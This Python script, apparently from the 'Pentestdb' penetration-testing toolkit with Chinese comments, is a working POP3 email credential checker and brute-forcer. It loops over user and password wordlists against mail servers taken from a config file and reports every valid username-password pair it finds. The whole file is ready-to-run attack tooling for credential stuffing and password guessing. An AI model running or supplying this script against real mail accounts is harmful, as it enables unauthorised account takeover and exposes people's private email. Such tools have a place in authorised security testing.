#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2015 alpha1e0
==================================================================
Email 账户验证/爆破
'''


import os
import sys
import poplib
import argparse

from libs.commons import exceptionHook
from libs.commons import WordList
from libs.commons import Log
from libs.commons import Output
from libs.commons import PenError
from libs.commons import YamlConf



def checkMailAccount(server,user,password,ssl=False,port=None):
    '''
    验证一个Mail账户是否可用
    '''
    if not port:
        port = 995 if ssl else 110

    try:
        pop3 = poplib.POP3_SSL(server, port) if ssl else poplib.POP3(server, port)

        pop3.user(user)
        auth = pop3.pass_(password)
        pop3.quit()
    except Exception as error:
        #print "[!] chekcing {0} failed, reason:{1}".format(user, str(error))
        return False

    if "+OK" in auth:
        return True
    else:
        return False



def getConifg(args, mailServers, user):
    '''
    获取server、ssl、port设置信息
    '''
    try:
        serverSuffix = user.split("@")[1].strip()
    except IndexError:
        return None,None,None

    serverInfo = mailServers.get(serverSuffix, None)

    if not args.server:
        if serverInfo:
            server = serverInfo.get('server', None)
        else:
            server = None
    else:
        server = args.server.strip()

    if not server:
        return None,None,None

    if args.ssl:
        ssl = args.ssl
    else:
        if serverInfo:
            ssl = serverInfo.get('ssl',False)
        else:
            ssl = False

    if args.port:
        port = args.port
    else:
        if serverInfo:
            port = serverInfo.get('port',False)
        else:
            port = None

    return server,ssl,port



if __name__ == "__main__":
    sys.excepthook = exceptionHook

    parser = argparse.ArgumentParser(description=u"Mail账户验证/爆破")
    parser.add_argument("-c","--check", action="store_true", help=u"验证Mail账户")
    parser.add_argument("-a","--account", help=u"指定mail账户,使用空格分隔用户名与密码,使用 @file 指定mail账户列表文件")
    parser.add_argument("-b","--brute", action="store_true", help=u"爆破Mail账户")
    parser.add_argument("-u","--user", help=u"指定账户名, 使用 @file 指定账户名字典")
    parser.add_argument("-p","--password", help=u"指定密码, 使用 @file 指定密码字典")
    parser.add_argument("--server", help=u"指定 POP3 服务器.")
    parser.add_argument("--port", type=int, help=u"手动指定端口")
    parser.add_argument("--ssl", action="store_true", help=u"强制使用SSL")
    parser.add_argument("--output", help=u"输出结果到文件")
    args = parser.parse_args()

    with Output(u"Mail验证/爆破功能", args.output) as out:
        log = Log("mail", tofile=False)
        serverFile = os.path.join(sys.path[0],"data","mail_servers.yaml")
        try:
            mailServers = YamlConf(serverFile)
        except PenError as error:
            out.error(str(error))
            sys.exit(1)

        if args.check:
            if not args.account:
                out.error(u"缺少 -a/--account 参数")
                sys.exit(1)

            result = []
            accounts = WordList(args.account[1:]) if args.account.startswith("@") else [args.account]
            for line in accounts:
                sp = line.split()
                if len(sp) < 2: continue
                user = sp[0]
                password = sp[1]
                server,ssl,port = getConifg(args,mailServers,user)
                log.debug("checking '{0}' '{1}' '{2}'".format(user, password, server))
                if checkMailAccount(server, user, password, ssl, port):
                    log.debug(">>>>success, user is {0}, password is {1}".format(user, password))
                    result.append("{0} {1}".format(user, password))

            if result:
                out.warnning(u"Mail账户验证结果:")
                for r in result:
                    out.info(r)
                    out.write(r)
            else:
                out.warnning(u"未验证到Mail账户")

        else:
            if not args.user:
                out.error(u"缺少 -u/--user 参数")
                sys.exit(1)
            if not args.password:
                out.error(u"缺少 -p/--password 参数")
                sys.exit(1)

            result = []
            users = WordList(args.user[1:]) if args.user.startswith("@") else [args.user]
            for user in users:
                server,ssl,port = getConifg(args,mailServers,user)
                if not server:
                    continue

                passwords = WordList(args.password[1:]) if args.password.startswith("@") else [args.password]
                for password in passwords:
                    log.debug("checking '{0}' '{1}' '{2}'".format(user, password, server))
                    if checkMailAccount(server, user, password, ssl, port):
                        log.debug(">>>>success, user is {0}, password is {1}".format(user, password))
                        result.append("{0} {1}".format(user, password))
            
            if result:
                out.warnning(u"Mail账户验证结果:")
                for r in result:
                    out.raw(r)
                    out.write(r)
            else:
                out.warnning(u"未爆破到Mail账户")




    

